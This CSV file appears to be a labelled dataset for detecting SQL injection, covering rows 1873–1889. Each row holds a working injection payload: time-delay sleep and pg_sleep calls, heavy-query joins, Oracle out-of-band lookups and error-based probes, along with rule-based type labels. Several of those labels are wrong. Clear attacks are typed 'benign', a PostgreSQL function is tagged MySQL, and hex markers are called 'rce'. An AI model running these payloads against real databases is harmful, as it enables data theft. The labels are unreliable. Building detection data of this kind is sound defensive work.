row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1873,"1%' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1874,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
1875,-5967 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # lhoh,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1876,"1'+ ( select dyfw where 7743 = 7743 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
1877,1' ) where 9272 = 9272,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1878,"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1879,"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
1880,"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1881,"1'|| ( select 'vekn' from dual where 4929 = 4929 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",1,,boolean_blind,oracle,0.95,4929 = 4929 and detected — boolean_blind injection (priority 8) on oracle,rule-based
1882,"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1883,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'cqwz' like 'cqwz,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1884,"1' in boolean mode ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
1885,"1"" ) ) as iubt where 8179 = 8179 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1886,1%' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1887,"1"" where 9230 = 9230",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1888,"1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""msjh"" like ""msjh",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1889,1' ) ) as plgq where 1121 = 1121,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
